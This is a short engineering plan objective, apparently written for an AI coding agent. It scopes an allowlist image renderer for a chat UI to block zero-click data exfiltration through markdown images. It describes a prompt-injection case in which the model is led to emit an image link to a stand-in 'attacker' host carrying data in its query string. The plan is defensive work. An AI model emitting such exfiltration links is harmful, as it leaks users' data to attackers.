<objective>
Close the zero-click image exfiltration channel in rendered answers with a minimal allowlist renderer behind its own switch.

Purpose: A-10 pulls one output-side control into this phase: an injection that slips through could make the model emit `![](https://attacker/?q=...)`, and the web UI loads it with no click because react-markdown has no img override and the app sets no img-src CSP (research F-11). Link filtering, CSP and WhatsApp previews stay out (the WhatsApp item is in the backlog through plan 05.1-05).
Output: the allowlist helper, the two renderer overrides, tests.

Runs after Phase 5 is complete. Relies on: plans 05.1-04 (NEXT_PUBLIC_RAG_IMAGE_ALLOWLIST), 05-20 and 05-23 (last edits to chat-message.tsx, including citation chips and the badge). Rollout position: A-10 (no D-19 step; it lands with the tagging work).

Commit rule for every task: plain `git commit`; the message ends with the attribution lines the executor's own session supplies; never copy them from a plan. Test URLs use example hosts only.
</objective>
